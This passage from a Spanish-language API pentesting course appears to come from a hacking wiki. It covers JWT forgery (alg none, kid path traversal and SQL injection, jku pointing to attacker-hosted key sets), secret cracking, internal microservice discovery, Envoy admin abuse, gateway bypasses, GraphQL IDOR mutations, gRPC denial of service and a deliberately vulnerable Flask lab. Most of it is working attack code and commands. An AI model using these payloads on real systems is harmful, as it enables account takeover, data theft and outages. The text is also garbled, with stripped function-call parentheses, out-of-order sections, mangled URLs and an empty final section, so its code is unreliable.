```python
import base64, json

payload = {"sub": "1", "role": "admin", "exp": 9999999999}
header = {"alg": "none", "typ": "JWT"}

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode).decode.rstrip("=")

token = f"{b64(header)}.{b64(payload)}."
print(f"Token without signature: {token}")
```

**Variantes de "none":**
```
none, None, NONE, nOnE, null, Null, NULL, undefined
```

**Test automatico:**
```bash
for algo in none None NONE null Null undefined; do token=$(python3 -c "
import base64, json
h = {'alg': '$algo', 'typ': 'JWT'}
p = {'sub': '1', 'role': 'admin', 'exp': 9999999999}
def b(d): return base64.urlsafe_b64encode(json.dumps(d).encode).decode.rstrip('=')
print(f'{b(h)}.{b(p)}.') ") code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $token" https://target.com/api/admin) echo "alg=$algo -> $code"
done
```

<a name="kid-injection"></a>
### 8.4 Kid injection

El header "kid" (Key ID) le dice al servidor que clave usar. Si el servidor construye la ruta usando kid:

```json
{"alg": "HS256", "typ": "JWT", "kid": "././etc/passwd"}
```

El servidor hace algo como:
```python
key_file = f"/keys/{kid}.pem"
with open(key_file) as f: key = f.read
```

**[sql injection](../raw/w3b-h4ck1ng.md#sql-injection) via kid:**
```json
{"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT 'secret' --"}
```

```python
import jwt, requests

def exploit_kid_sqli(url, kid_payload): payload = {"sub": "1", "role": "admin", "exp": 9999999999} headers = {"alg": "HS256", "kid": kid_payload} token = jwt.encode(payload, "secret", algorithm="HS256", headers=headers) r = requests.get(f"{url}/api/admin", headers={"Authorization": f"Bearer {token}"}) return r.status_code, r.text

code, data = exploit_kid_sqli("https://target.com", "' UNION SELECT 'secret' --")
print(f"Status: {code}")
```

<a name="jku-injection"></a>
### 8.5 Jku injection

El header "jku" (JWK [set](../raw/ph1sh1ng.md#social-engineering-toolkit) URL) le dice al servidor donde encontrar la clave publica.

```json
{"alg": "RS256", "typ": "JWT", "jku": "https://attacker.com/keys.json"}
```

**El ataque:**
1. Genera tu par [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa)
2. Hostea tu JWKS
3. Crea JWT apuntando a tu jku
4. Firma con tu clave privada

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

python3 << 'EOF'
from jwcrypto import jwk
import json

with open("public.pem", "rb") as f: key = jwk.JWK.from_pem(f.read)
jwks = {"keys": [json.loads(key.export)]}
with open("jwks.json", "w") as f: json.dump(jwks, f, indent=2)
print("JWKS created")
EOF

# Hostear con python -m http.server 9999 + ngrok

python3 << 'EOF'
import jwt
with open("private.pem", "rb") as f: private_key = f.read
payload = {"sub": "1", "role": "admin", "exp": 9999999999}
headers = {"alg": "RS256", "jku": "https://your-ngrok.ngrok.io/jwks.json"}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(f"Token: {token}")
EOF
```

<a name="weak-secret"></a>
### 8.6 Weak secret [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

Si el token usa HS256 con secreto debil, se puede crackear.

```bash
# Con hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# Con jwt_tool
python3 jwt_tool.py -C -d rockyou.txt token.txt
```

**Script custom de cracking:**
```python
import jwt
from concurrent.futures import ThreadPoolExecutor

def try_secret(token, secret): try: payload = jwt.decode(token, secret, algorithms=["HS256"]) print(f"[+] Found secret: {secret}") return secret except: return None

def crack_jwt(token, wordlist): with open(wordlist, "r", encoding="latin-1", errors="ignore") as f: passwords = [l.strip for l in f] with ThreadPoolExecutor(max_workers=20) as ex: for pw in passwords: r = ex.submit(try_secret, token, pw) if r.result: return r.result return None

# Secrets comunes: secret, secret_key, jwt_secret, supersecret, changeme, password, abc123, key, test, debug, default
```

<a name="token-lifetime"></a>
### 8.7 Token lifetime manipulation

**Problemas comunes:**
1. No hay exp: token nunca expira
2. exp en el futuro lejano
3. No verifican nbf

```python
import jwt, time

# Token sin exp
payload = {"sub": "1", "role": "admin"}
token = jwt.encode(payload, "secret", algorithm="HS256")

# Token con exp en el pasado
payload = {"sub": "1", "exp": 1000000000}  # ano 2001
token = jwt.encode(payload, "secret", algorithm="HS256")

# Token con nbf en el futuro
payload = {"sub": "1", "nbf": int(time.time) + 3600}
token = jwt.encode(payload, "secret", algorithm="HS256")
```

<a name="tools-jwt"></a>
### 8.8 Tools

**jwt_tool (swiss army knife de JWTs):**
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip install -r requirements.txt

python3 jwt_tool.py <token> # Decodificar
python3 jwt_tool.py <token> -X a -pk public.pem # Algorithm confusion
python3 jwt_tool.py <token> -X n # None algorithm
python3 jwt_tool.py <token> -X k -I "kid: '././etc/passwd'"  # Kid injection
python3 jwt_tool.py <token> -X j -ju "https://evil.com/jwks.json"  # Jku injection
python3 jwt_tool.py <token> -C -d rockyou.txt # Cracking
python3 jwt_tool.py <token> -T # Scan vulnerabilities
python3 jwt_tool.py <token> -I -pc "role" -pv "admin" # Modify payload
```

<a name="ejercicios-jwt"></a>
### 8.9 Ejercicios pricticos

**Ejercicio 1: Analizar JWT**
Dado el token:
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MjQyNjIyfQ.signature
```
1. Que algoritmo usa?
2. Cual es el rol del usuario?
3. Se puede modificar el rol a admin?

**Ejercicio 2 (Pructico): Laboratorio JWT**
```python
from flask import Flask, request, jsonify
import jwt, time

app = Flask(__name__)
PRIVATE_KEY = open("private.pem").read
WEAK_SECRET = "secret"

users = { "admin": {"password": "admin123", "role": "admin"}, "user1": {"password": "pass123", "role": "user"}
}

@app.route('/api/login', methods=['POST'])
def login: data = request.json user = users.get(data.get('username') if user and user['password'] == data.get('password'): token = jwt.encode({"sub": data['username'], "role": user['role'], "exp": time.time+3600}, PRIVATE_KEY, algorithm="RS256") return jsonify({"token": token}) return jsonify({"error": "Invalid"}), 401

@app.route('/api/admin', methods=['GET'])
def admin: token = request.headers.get('Authorization', '').replace('Bearer ', '') try: header = jwt.get_unverified_header(token) algo = header['alg'] if algo == 'RS256': payload = jwt.decode(token, PRIVATE_KEY, algorithms=['RS256']) else: payload = jwt.decode(token, WEAK_SECRET, algorithms=['HS256', 'none']) if payload.get('role') == 'admin': return jsonify({"message": "Welcome admin!", "flag": "flag{jwt_master}"}) return jsonify({"error": "Not admin"}), 403 except Exception as e: return jsonify({"error": str(e)}), 401

@app.route('/.well-known/jwks.json')
def jwks: return jsonify({"keys": [{"kty": "RSA"}]})

app.run(debug=True, port=5000)
```

**Desafios:**
1. Logueate como user1 y obtene token
2. Cambia alg a none y modifica rol a admin
3. Usa algorithm confusion con clave publica
4. Crackea el secreto debil

--- <a name="microservices"></a>
## 9. Microservices communication Security

<a name="service-auth-bypass"></a>
### 9.1 Service-to-service auth bypass

En microservicios, la comunicacion interna suele ser el eslabon mas debil.

**El problema tipico:**
```
Gateway (con auth) -> Servicio A (sin auth) -> Servicio B (sin auth)
```

El gateway verifica tokens, pero una vez dentro, los servicios hablan sin autenticacionc.

**Como se autentican los servicios:**
1. mtls: [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) mutuo con certificados
2. [jwt](../raw/4p1-s3cur1ty.md#jwt) service tokens: machine-to-machine
3. API keys: claves compartidas
4. Network policies: solo [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) especificas
5. Nada: "porque estan en la misma [red](../raw/r3d3s-f0nd4m3nt0s.md)" (el mas comun)

**Ataques comunes:**
```bash
# Acceso directo a servicio interno
curl http://internal-service:8080/api/users

# DNS rebinding
curl http://user-service.prod.svc.cluster.local:8080/users
```

<a name="internal-discovery"></a>
### 9.2 Internal API discovery

**Service Discovery endpoints:**
```bash
# Kubernetes API
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/services

# Consul
curl http://consul.service.consul:8500/v1/catalog/services
curl http://consul.service.consul:8500/v1/catalog/service/user-service

# Eureka
curl http://eureka:8761/eureka/apps

# etcd
curl http://etcd:2379/v2/keys/services

# Envoy admin
curl http://localhost:15000/clusters
curl http://localhost:15000/listeners
curl http://localhost:15000/routes
```

**Internal [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) patterns:**
```
<service>.<namespace>.svc.cluster.local
user-service.default.svc.cluster.local:8080
payment-service.default.svc.cluster.local:9090
```

**Port scanning interno:**
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex(host, port) sock.close if result == 0: print(f"[+] {host}:{port} OPEN") return result == 0

services = ["user-service", "payment-service", "order-service", "auth-service", "redis", "kafka"]
ports = [80, 443, 3000, 5000, 8080, 8443, 9090, 6379, 5432, 27017]

for svc in services: for p in ports: scan_port(f"{svc}.default.svc.cluster.local", p)
```

<a name="service-mesh"></a>
### 9.3 Service mesh attacks

Service mesh (Istio, Linkerd) agrega seguridad, pero tambien nuevos vectores.

**Envoy admin interface:**
```bash
# Si el atacante accede al pod:
curl http://localhost:15000/config_dump
curl http://localhost:15000/clusters
curl http://localhost:15000/certs
curl http://localhost:15000/listeners
curl http://localhost:15000/logging?level=debug
curl http://localhost:15000/quitquitquit  # Apaga Envoy!
```

**Bypass de mTLS:**
```bash
# Si un servicio tiene excepcion de mTLS
curl http://user-service:8080/users

# O si el sidecar tiene rutas sin autenticacion
curl http://localhost:15090/statistics
```

**Istio auth bypass:**
```bash
# Si Istio usa jwt-mutual pero hay rutas exentas
curl -H "Authorization: Bearer invalid" http://service:8080/public

# Si el peer authentication es PERMISSIVE
# (permite mTLS y plaintext)
```

<a name="api-gateway-bypass"></a>
### 9.4 API Gateway bypass

**Bypass via host header:**
```bash
# Si el gateway enruta por host
curl -H "Host: internal-admin.internal" https://gateway/api/users

# Bypass via path traversal
curl https://gateway/api/./internal/users
```

**Bypass via [http](../raw/r3d3s-f0nd4m3nt0s.md#http) method:**
```bash
# Si el gateway solo filtra GET
curl -X POST https://gateway/api/admin/users -d '{"role": "admin"}'
```

<a name="sidecar"></a>
### 9.5 Sidecar [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) exploitation

**Envoy configuration dumping:**
```bash
curl -s http://localhost:15000/config_dump | python3 -m json.tool > envoy_config.json
grep -i "route" envoy_config.json
grep -i "cluster" envoy_config.json
grep -i "secret" envoy_config.json
```

**Linkerd tap:**
```bash
# Si linkerd-viz esta instalado
linkerd tap deploy/web -n default | grep :method
```

<a name="ejercicios-microservices"></a>
### 9.6 Ejercicios pricticos

**Ejercicio 1: Enumeracion de servicios**
```bash
# Asumiendo acceso a un pod:
nslookup kubernetes.default.svc
curl -k https://kubernetes.default.svc/api/v1/services
```

**Ejercicio 2: Bypass de API Gateway**
```bash
curl https://api.target.com/api/admin/users
curl https://api.target.com/api/v1/admin/users
curl https://admin.target.com/api/users
curl -H "X-Forwarded-For: 127.0.0.1" https://api.target.com/api/internal/users
```

--- <a name="tools-deep-dive"></a>
## 10. Tools Deep Dive

<a name="postman-pentesting"></a>
### 10.1 Postman para pentesting

Postman no es solo para devs. Tambien es util para pentesting de APIs.

**Features utiles:**
- Collections: organiza requests por vulnerabilidadc
- Environments: cambia entre target, token, etc.
- Pre-request Scripts: genera tokens, timestamps
- Tests: assertions automatizadas
- Runner: automatiza secuencias

**Pre-request Script para [jwt](../raw/4p1-s3cur1ty.md#jwt):**
```javascript
// Generar token JWT antes de cada request
const crypto = require('crypto-js');
const base64Url = (str) => { return btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
};

const header = base64Url(JSON.stringify({"alg": "HS256", "typ": "JWT"});
const payload = base64Url(JSON.stringify({ "sub": "1", "role": "admin", "exp": Math.floor(Date.now / 1000) + 3600
});

const signature = base64Url( crypto.HmacSHA256(header + "." + payload, "secret").toString(crypto.enc.Base64)
);

pm.environment.set("jwt", header + "." + payload + "." + signature);
```

**Collection Runner para [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta):**
```javascript
// Datos de prueba desde CSV
const data = JSON.parse(pm.iterationData.get("payload");
pm.request.body.raw = JSON.stringify(data);
```

<a name="burp-extensions"></a>
### 10.2 [burp suite](../raw/w3b-h4ck1ng.md#burp-suite): extensions y automatizacion

**Extensions esenciales para APIs:**

1. **Autorize**: Detecta [bola](../raw/4p1-s3cur1ty.md#bola)/BFLA automaticamente - Configura dos sesiones (user normal + admin) - Hace requests y compara resultados - Marca endpoints donde el user normal accede a datos admin

2. **InQL**: Pentesting de [graphql](../raw/4p1-s3cur1ty.md#graphql) - Genera queries del schema - Prueba introspection - Exporta schema

3. **JSON Web Tokens**: Manipula JWTs - Decodifica tokens automaticamente - Prueba algorithm confusion - [csrf](../raw/w3b-h4ck1ng.md#csrf) bypass

4. **Turbo Intruder**: Fuerza bruta rapida - [python](../raw/pyth0n-f0r-h4ck1ng.md)-based - [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/2 support - Race condition testing

**Autorize en accion:**
```
1. Configura sesion de usuario normal (cookie/token)
2. Configura sesion de admin
3. Navega por la app como admin
4. Autorize replica los requests con el user normal
5. Si el user normal recibe 200 y deberia ser 403 -> BOLA/BFLA
```

<a name="kiterunner"></a>
### 10.3 Kiterunner: discovery de endpoints

Kiterunner es la mejor herramienta para descubrir endpoints de APIs.

**Instalacion:**
```bash
wget https://github.com/assetnote/kiterunner/releases/latest/download/kiterunner_linux_amd64.tar.gz
tar -xzvf kiterunner_linux_amd64.tar.gz
sudo mv kr /usr/local/bin/
```

**Uso:**
```bash
# Scan basico
kr scan https://target.com -w ~/tools/api-routes.txt

# Con wordlist de Assetnote
kr scan https://target.com -w ~/tools/apis-small.txt -A json

# Con threads
kr scan https://target.com -w routes.txt -t 50

# Guardar resultados en JSON
kr scan https://target.com -w routes.txt -o results.json

# Filtrar por status code
kr scan https://target.com -w routes.txt --status-codes 200,201,403
```

**Wordlists recomendadas:**
```
# Assetnote (las mejores para APIs):
https://wordlists.assetnote.io/

# rutas comunes:
/api
/api/v1
/api/v2
/api/v3
/api/users
/api/admin
/api/health
/api/metrics
/api/swagger.json
/api/openapi.json
/api/graphql
/internal
/private
```

<a name="arjun"></a>
### 10.4 Arjun: parameter discovery

Arjun descubre parametros ocultos en endpoints HTTP.

**Instalacion:**
```bash
pip install arjun
```

**Uso:**
```bash
# Descubrir parametros en un endpoint
arjun -u https://target.com/api/users

# Con wordlist personalizada
arjun -u https://target.com/api/users -w params.txt

# Con metodo POST
arjun -u https://target.com/api/users -m POST

# Con headers
arjun -u https://target.com/api/users -H "Authorization: Bearer token"

# Exportar resultados
arjun -u https://target.com/api/users -oJ results.json
```

**Como funciona:**
Arjun envia requests con diferentes parametros y analiza los cambios en la respuesta:
- Cambio en el tamano de la respuesta
- Cambio en status code
- Aparicion de nuevos campos en JSON

**Parametros comunes que busca:**
```
id, user_id, user, username, email, token, api_key, secret,
page, limit, offset, sort, order, filter, search, q,
debug, admin, test, dev, type, category, role, access
```

<a name="jwt-tool"></a>
### 10.5 jwt_tool: el swiss army knife de JWTs

Ya lo cubrimos en 8.8, pero aca van mas usos avanzados.

```bash
# Testear todas las vulnerabilidades
python3 jwt_tool.py <token> -T

# Explotar algorithm confusion automaticamente
python3 jwt_tool.py <token> -X a -pk public.pem

# Explotar kid injection con SQLi
python3 jwt_tool.py <token> -X k -I "kid: ' UNION SELECT 'key' --"

# Modificar claims
python3 jwt_tool.py <token> -I -pc role -pv admin -pc exp -pv 9999999999

# Firmar con clave personalizada
python3 jwt_tool.py <token> -S hs256 -k "custom_secret"

# Verificar firma
python3 jwt_tool.py <token> -V -k secret_key
```

<a name="graphqlmap"></a>
### 10.6 GraphQLMap: automatizando GraphQL

```bash
# Instalacion
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap && pip3 install -r requirements.txt

# Modo interactivo
python3 graphqlmap.py -u https://target.com/graphql

# Comandos dentro de la shell:
help # Ayuda
dump # Dump schema completo
queries # Listar queries
mutations # Listar mutations
search <keyword> # Buscar en schema
search_field <f> # Buscar campo
search_type <t> # Buscar tipo
graphql <query> # Ejecutar query custom
```

<a name="grpcurl-tool"></a>
### 10.7 grpcurl: el curl de gRPC

```bash
# Enumeracion completa
grpcurl -plaintext localhost:5000 list
grpcurl -plaintext localhost:5000 list PackageService
grpcurl -plaintext localhost:5000 describe PackageService.Method

# Con proto file
grpcurl -plaintext -proto service.proto localhost:5000 Service/Method

# Con import-path
grpcurl -plaintext -import-path ./protos -proto service.proto localhost:5000 Service/Method

# JSON output
grpcurl -plaintext -d '{"id": 1}' -format json localhost:5000 Service/Get

# Con metadata (headers)
grpcurl -plaintext -H "authorization: Bearer token" -d '{}' localhost:5000 Service/Method

# Con TLS
grpcurl -cacert ca.pem -cert client.pem -key client.key localhost:5000 list
```

--- <a name="laboratorio-integrador"></a>
## 11. Laboratorio Practico Integrador

<a name="setup-lab"></a>
### 11.1 Setup del lab

Este laboratorio integra todas las vulnerabilidadces cubiertas.

**Requisitos:**
```bash
pip install flask pyjwt graphene flask-sqlalchemy requests grpcio grpcio-tools
```

**Lab completo (api_lab.py):**
```python
from flask import Flask, request, jsonify
import jwt, time, json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'weak-secret'

# Base de datos simulada
users = { 1: {"id": 1, "username": "admin", "password": "admin123", "role": "admin", "secret": "flag{lab_complete}"}, 2: {"id": 2, "username": "alice", "password": "alice123", "role": "user", "coins": 500}, 3: {"id": 3, "username": "bob", "password": "bob123", "role": "user", "coins": 100},
}

orders = { 101: {"id": 101, "user_id": 2, "product": "Laptop", "price": 1200}, 102: {"id": 102, "user_id": 3, "product": "Mouse", "price": 50},
}

# ========== AUTH ==========
@app.route('/api/login', methods=['POST'])
def login: data = request.json for uid, u in users.items: if u['username'] == data['username'] and u['password'] == data['password']: token = jwt.encode({"user_id": uid, "role": u['role']}, app.config['SECRET_KEY'], algorithm="HS256") return jsonify({"token": token}) return jsonify({"error": "Invalid"}), 401

# ========== BOLA - IDOR en profile ==========
@app.route('/api/users/<int:user_id>', methods=['GET'])
def get_user(user_id): # VULNERABLE: No verifica que el token pertenezca al user_id user = users.get(user_id) if user: return jsonify(user) return jsonify({"error": "Not found"}), 404

# ========== BFLA - Admin sin verificacion ==========
@app.route('/api/admin/users', methods=['GET'])
def admin_users: # VULNERABLE: No verifica rol de admin return jsonify(list(users.values)

@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
def admin_delete(user_id): # VULNERABLE: No verifica rol if user_id in users: del users[user_id] return jsonify({"message": "Deleted"}) return jsonify({"error": "Not found"}), 404

# ========== MASS ASSIGNMENT ==========
@app.route('/api/register', methods=['POST'])
def register: data = request.json new_id = max(users.keys) + 1 # VULNERABLE: Asigna todos los campos del body users[new_id] = {"id": new_id, **data} return jsonify(users[new_id]), 201

# ========== GRAPHQL ==========
import graphene

class UserType(graphene.ObjectType): id = graphene.Int username = graphene.String password = graphene.String role = graphene.String secret = graphene.String coins = graphene.Int

class Query(graphene.ObjectType): user = graphene.Field(UserType, id=graphene.Int) users = graphene.List(UserType) def resolve_user(self, info, id): return users.get(id) def resolve_users(self, info): return list(users.values)

schema = graphene.Schema(query=Query)

@app.route('/graphql', methods=['POST'])
def graphql: data = request.get_json result = schema.execute(data['query']) return jsonify({"data": result.data})

if __name__ == '__main__': app.run(debug=True, host='0.0.0.0', port=5000)
```

<a name="fase1-[reconocimiento](./raw/"></a>
### 11.2 Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento)

**Objetivo:** Descubrir todos los endpoints de la API.

```bash
# 1. Probar endpoints comunes
for ep in api/v1/users api/v2/users api/admin/users graphql swagger.json openapi.json .env; do code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:5000/$ep") echo "$ep -> $code"
done

# 2. Obtener schema GraphQL
curl -X POST http://localhost:5000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}'

# 3. Login como user normal
TOKEN=$(curl -s -X POST http://localhost:5000/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
```

<a name="fase2-bola-bfla"></a>
### 11.3 Fase 2: [bola](../raw/4p1-s3cur1ty.md#bola) y BFLA

**Objetivo:** Explotar IDOR para acceder a datos de otros usuarios y funcioniones)es admin.

```bash
# BOLA: Acceder a perfil de admin
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/users/1

# BOLA: Enumerar usuarios del 1 al 10
for i in $(seq 1 10); do data=$(curl -s -H "Authorization: Bearer $TOKEN" "http://localhost:5000/api/users/$i") echo "User $i: $data"
done

# BFLA: Acceder a endpoint admin
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/admin/users

# BFLA: Eliminar admin
curl -X DELETE -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/admin/users/1
```

<a name="fase3-jwt"></a>
### 11.4 Fase 3: [jwt](../raw/4p1-s3cur1ty.md#jwt) manipulation

**Objetivo:** Forjar un token JWT con role admin.

```python
import jwt, base64, json

# Decodificar token
parts = "$TOKEN".split('.')
for i, name in enumerate(['Header', 'Payload']): padded = parts[i] + '=' * (4 - len(parts[i]) % 4) print(f"{name}: {json.loads(base64.urlsafe_b64decode(padded)}")

# Crackear secreto debil
for secret in ["secret", "weak-secret", "key", "password", "admin", "test", "123456"]: try: payload = jwt.decode("$TOKEN", secret, algorithms=["HS256"]) print(f"[+] Secreto encontrado: {secret}") break except: pass

# Forjar token admin
admin_token = jwt.encode({"user_id": 1, "role": "admin"}, "weak-secret", algorithm="HS256")
print(f"Admin token: {admin_token}")
```

```bash
# Usar token forjado
curl -H "Authorization: Bearer $admin_token" http://localhost:5000/api/admin/users
```

<a name="fase4-graphql"></a>
### 11.5 Fase 4: [graphql](../raw/4p1-s3cur1ty.md#graphql) exploitation

**Objetivo:** Extraer datos via GraphQL.

```bash
# Obtener todos los usuarios via GraphQL
curl -X POST http://localhost:5000/graphql -H "Content-Type: application/json" -d '{"query":"{ users { id username password role secret } }"}'

# Obtener usuario especifico
curl -X POST http://localhost:5000/graphql -H "Content-Type: application/json" -d '{"query":"{ user(id: 1) { username password secret role } }"}'

# Batching: multiples usuarios en un request
curl -X POST http://localhost:5000/graphql -H "Content-Type: application/json" -d '{"query":"{ u1: user(id: 1) { username password } u2: user(id: 2) { username password } u3: user(id: 3) { username password } }"}'
```

<a name="fase5-lateral"></a>
### 11.6 Fase 5: Microservices lateral movement

**Objetivo:** Descubrir y acceder a servicios internos.

```bash
# Asumiendo que hay otros servicios corriendo:
for port in 3000 4000 5000 6000 7000 8000 9000; do result=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port/" --connect-timeout 2 2>/dev/null) if [ "$result" != "000" ]; then echo "Service on port $port: $result" fi
done

# Buscar endpoints comunes en servicios descubiertos
for ep in health metrics info admin users api; do curl -s "http://localhost:3000/$ep" | head -1
done
```

<a name="reporte-final"></a>
### 11.7 Reporte final

**Checklist de hallazgos:**
-  BOLA/IDOR en /api/users/<id>
-  BFLA en /api/admin/users
-  Mass Assignment en /api/register
-  JWT con secreto debil (crackeable)
-  GraphQL introspection habilitada
-  GraphQL expone passwords
-  [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) ausente
-  No hay [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) en endpoints admin
-  Verbose error messages

**Evidencia:**
```bash
# Guardar evidencia de cada hallazgo
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/users/1 > bola_evidence.json
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/admin/users > bfla_evidence.json
curl -s -X POST http://localhost:5000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' > graphql_schema.json
```

<a name="referencias"></a>
## 12. Referencias y Recursos

**[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10):**
- OWASP [api security](../raw/4p1-s3cur1ty.md) Top 10: httpss)://owasp.org/www-project-api-security/
- OWASP Web Security Testing Guide: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://owasp.org/www-project-web-security-testing-guide/

**Herramientas:**
- jwt_tool: https://github.[com](../raw/w1n-s9bsyst3ms.md#com)/ticarpi/jwt_tool
- graphqlMap: https://github.com/swisskyrepo/GraphQLmap
- InQL: https://github.com/doyensec/inql
- Kiterunner: https://github.com/assetnote/kiterunner
- Arjun: https://github.com/s0md3v/Arjun
- grpcurl: https://github.com/fullstorydev/grpcurl
- [burp suite](../raw/w3b-h4ck1ng.md#burp-suite): https://portswigger.net/burp

**Laboratorios:**
- crAPI (Completely Ridiculous API): https://github.com/OWASP/crAPI
- VAmPI: https://github.com/erev0s/VAmPI
- DVGA (Damn Vulnerable [graphql](../raw/4p1-s3cur1ty.md#graphql) Application): https://github.com/nicoshun/dvga
- DVWS (Damn Vulnerable Web Services): https://github.com/vulhub/vulhub

**Lectura recomendada:**
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "API Security in Action" - Neil Madden
- "Hacking APIs" - Corey Ball
- PortSwigger Research: https://portswigger.net/research

**ctfs y desafios:**
- https://pentesterlab.com/
- https://www.root-me.org/
- https://www.[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)-h4ckth3b0x.md#[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)).com/
- https://portswigger.net/web-security

--- <a name="bola-advanced"></a>
### 3.7 [bola](../raw/4p1-s3cur1ty.md#bola) avanzado: bypass de [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) en cascada

No siempre es un ID directo. A veces hay que saltar varios objetos.

**BOLA en cadenas de objetos:**
```http
GET /api/companies/5/projects/12/issues/456 HTTP/1.1
Authorization: Bearer user_token
```

Aunque el issue 456 sea de tu proyecto, la company 5 puede no ser la tuya. Cada nivel deberia verificar autorizacion.

**BOLA en endpoints de busqueda:**
```http
POST /api/search/users HTTP/1.1
Content-Type: application/json
{"search": "admin", "limit": 1000}
```

Si la busqueda no filtra por autorizacion, podes encontrar usuarios que no deberias ver.

**BOLA via GraphQL relaciones:**
```graphql
query { myProfile { id username } allUsers: users { id username email password role }
}
```

Si users no filtra por autorizacion, es BOLA.

### 3.8 IDOR en APIs GraphQL

GraphQL mutations con IDOR son muy comunes.

```graphql
mutation { updateUser(input: { id: 1,  # IDOR: estas modificando otro user role: "admin" }) { id role }
}
```

```graphql
mutation { deleteUser(id: 2) {  # IDOR: eliminas otro user success }
}
```

<a name="bfla-advanced"></a>
### 4.8 BFLA avanzado: escalacion via API composition

En microservicios, un endpoint puede llamar a varios servicios internos. Si uno de esos servicios no verifica autorizacion, podes escalar.

**Caso real:**
```http
POST /api/order/checkout HTTP/1.1
Authorization: Bearer user_token
Content-Type: application/json

{ "product": "laptop", "user_id": 1,  # Intentas comprar como otro user "coupon": "ADMIN50"  # Cupon de admin
}
```

El servicio de orders llama al servicio de users, coupons, payments. Si coupons no verifica que el cupon sea para tu rol -> BFLA.

### 4.9 Race conditions en APIs para BFLA

A veces podes ganar una race condition para escalar.

```python
import requests, threading

def try_admin: r = requests.get("https://target.com/api/admin/users", headers={"Authorization": f"Bearer {token}"}) if r.status_code == 200: print(f"[+] BFLA exitoso!") print(r.text)

token = "user_token"
threads = 
for _ in range(100): t = threading.Thread(target=try_admin) threads.append(t) t.start

for t in threads: t.join
```

Si el servidor tiene una condicion de carrera al cargar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos), algunos requests pueden pasar.

<a name="graphql-depth-3"></a>
### 6.9 GraphQL: mutations peligrosas

No solo las queries son peligrosas. Las mutations pueden ser devastadoras.

**Mutation con Mass Assignment:**
```graphql
mutation { createUser(input: { username: "hacker", email: "hack@mail.com", password: "pass123", role: "SUPER_ADMIN",  # Mass Assignment! isVerified: true }) { id role }
}
```

**Mutation sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion):**
```graphql
mutation { resetPassword(email: "admin@target.com") { tempPassword }
}
```

**Mutation con IDOR:**
```graphql
mutation { transferMoney(input: { fromAccount: "user_1",  # Cuenta de otro usuario! toAccount: "attacker_1", amount: 999999 }) { success }
}
```

### 6.10 GraphQL: subscription abuse

Las subscriptions son WebSockets que emiten datos en tiempo real.

```graphql
subscription { userUpdated(id: 1) {  # IDOR: te suscribis a cambios de otro user username email role }
}
```

```graphql
subscription { adminNotification {  # Informacion admin en tiempo real action targetUser timestamp }
}
```

<a name="grpc-dos"></a>
### 7.8 gRPC: DoS via streaming

gRPC streaming puede ser usado para DoS.

**Client streaming DoS:**
```python
import grpc, time

channel = grpc.insecure_channel("localhost:5000")
stub = SomeServiceStub(channel)

# Enviar datos sin parar
def infinite_stream: while True: yield SomeRequest(data="A" * 1024 * 1024)  # 1MB cada vez time.sleep(0.001)

try: response = stub.ProcessStream(infinite_stream)
except: pass  # El server probablemente crashea
```

**Server streaming memory exhaustion:**
Si una subscription emite datos sin control, podes saturar la memoria:

```bash
grpcurl -plaintext -d '{"subscribe": true}' localhost:5000 events.EventService/Subscribe
```

<a name="jwt-advanced"></a>
### 8.10 [jwt](../raw/4p1-s3cur1ty.md#jwt): kty confusion (oct vs [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa))

Algunas librerias no validan el tipo de clave (kty) en JWKS.

```json
{"keys": [{"kty": "oct", "alg": "HS256", "k": "c2VjcmV0"}]}
```

Si el servidor espera RSA pero acepta oct (simetrica), podes injectar tu propio secreto via jku.

### 8.11 JWT: ephemeral key injection (ES256)

